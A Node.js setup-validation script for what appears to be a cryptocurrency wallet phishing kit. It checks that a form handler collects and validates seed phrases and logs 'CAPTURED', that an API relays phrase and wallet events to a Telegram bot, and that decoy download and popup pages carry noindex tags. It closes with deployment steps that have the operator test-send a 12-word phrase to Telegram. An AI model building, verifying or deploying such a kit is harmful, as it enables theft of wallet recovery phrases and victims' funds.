#!/usr/bin/env node
/**
 * Validation script - checks all files are correctly configured
 * Run: node validate.js
 */

import fs from 'fs';
import path from 'path';

const errors = [];
const warnings = [];

console.log('🔍 Validating Telegram Integration Setup...\n');

// Check API file
const apiPath = './api/telegram.js';
if (!fs.existsSync(apiPath)) {
  errors.push('❌ API file missing: api/telegram.js');
} else {
  const apiContent = fs.readFileSync(apiPath, 'utf8');
  
  // Check for TYPE matching
  const hasTestPhrase = apiContent.includes("TEST_PHRASE");
  const hasWalletCreated = apiContent.includes("WALLET_CREATED");
  const hasSeedTyped = apiContent.includes("SEED_TYPED");
  
  if (!hasTestPhrase) errors.push('❌ API missing TEST_PHRASE type');
  if (!hasWalletCreated) errors.push('❌ API missing WALLET_CREATED type');
  if (!hasSeedTyped) errors.push('❌ API missing SEED_TYPED type');
  
  // Check for flexible env var names
  const hasFlexibleToken = apiContent.includes('TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN') || 
                           apiContent.includes('BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN');
  if (!hasFlexibleToken) warnings.push('⚠️ API may not support BOT_TOKEN env var');
  
  console.log('✅ API file exists');
  console.log(hasTestPhrase ? '✅ TEST_PHRASE supported' : '❌ TEST_PHRASE missing');
  console.log(hasWalletCreated ? '✅ WALLET_CREATED supported' : '❌ WALLET_CREATED missing');
  console.log(hasSeedTyped ? '✅ SEED_TYPED supported' : '❌ SEED_TYPED missing');
}

// Check form-handler.js
const formHandlerPath = './dist/assets/form-handler.js';
if (!fs.existsSync(formHandlerPath)) {
  errors.push('❌ Client file missing: dist/assets/form-handler.js');
} else {
  const formContent = fs.readFileSync(formHandlerPath, 'utf8');
  
  const hasSendPhrase = formContent.includes('function sendPhrase');
  const hasCollectGrid = formContent.includes('function collectGridPhrase');
  const hasIsSeed = formContent.includes('function isSeed');
  const hasConsoleLog = formContent.includes("console.log('✅ CAPTURED')");
  
  if (!hasSendPhrase) errors.push('❌ form-handler.js missing sendPhrase function');
  if (!hasCollectGrid) errors.push('❌ form-handler.js missing collectGridPhrase function');
  if (!hasIsSeed) errors.push('❌ form-handler.js missing isSeed function');
  const hasAnyConsoleLog = formContent.includes("console.log('✅") || formContent.includes("console.log('🔑") || formContent.includes("console.log('📤");
  if (!hasAnyConsoleLog) warnings.push('⚠️ form-handler.js may lack debug logging');
  
  console.log('\n✅ Client file exists');
  console.log(hasSendPhrase ? '✅ sendPhrase function present' : '❌ sendPhrase missing');
  console.log(hasCollectGrid ? '✅ collectGridPhrase function present' : '❌ collectGridPhrase missing');
  console.log(hasIsSeed ? '✅ isSeed validation present' : '❌ isSeed missing');
  console.log(hasConsoleLog ? '✅ Debug logging present' : '⚠️ Debug logging may be missing');
}

// Check HTML files have noindex where needed
const downloadHtml = './dist/download.html';
const popupHtml = './dist/popup.html';
const indexHtml = './dist/index.html';

if (fs.existsSync(downloadHtml)) {
  const content = fs.readFileSync(downloadHtml, 'utf8');
  if (content.includes('noindex')) {
    console.log('\n✅ download.html has noindex');
  } else {
    warnings.push('⚠️ download.html missing noindex');
  }
}

if (fs.existsSync(popupHtml)) {
  const content = fs.readFileSync(popupHtml, 'utf8');
  if (content.includes('noindex')) {
    console.log('✅ popup.html has noindex');
  } else {
    warnings.push('⚠️ popup.html missing noindex');
  }
}

if (fs.existsSync(indexHtml)) {
  const content = fs.readFileSync(indexHtml, 'utf8');
  if (content.includes('index, follow')) {
    console.log('✅ index.html is indexable');
  } else {
    warnings.push('⚠️ index.html may not be indexable');
  }
}

// Check test-telegram.html
const testHtml = './test-telegram.html';
if (fs.existsSync(testHtml)) {
  const content = fs.readFileSync(testHtml, 'utf8');
  const hasPhraseTest = content.includes('sendTestPhrase');
  const hasWordCount = content.includes('wordCount');
  
  console.log('\n✅ test-telegram.html exists');
  console.log(hasPhraseTest ? '✅ Phrase test function present' : '❌ Phrase test missing');
  console.log(hasWordCount ? '✅ Word counter present' : '❌ Word counter missing');
} else {
  warnings.push('⚠️ test-telegram.html not found');
}

// Summary
console.log('\n' + '='.repeat(50));
if (errors.length === 0 && warnings.length === 0) {
  console.log('✅ ALL CHECKS PASSED - Ready to deploy!');
  console.log('\nNext steps:');
  console.log('1. Deploy to Vercel');
  console.log('2. Visit /test-telegram.html on your live site');
  console.log('3. Enter 12 words and click "Send Test Phrase"');
  console.log('4. Check Telegram for the message');
  process.exit(0);
} else {
  if (errors.length > 0) {
    console.log('❌ ERRORS FOUND:');
    errors.forEach(e => console.log('  ' + e));
  }
  if (warnings.length > 0) {
    console.log('\n⚠️ WARNINGS:');
    warnings.forEach(w => console.log('  ' + w));
  }
  process.exit(1);
}
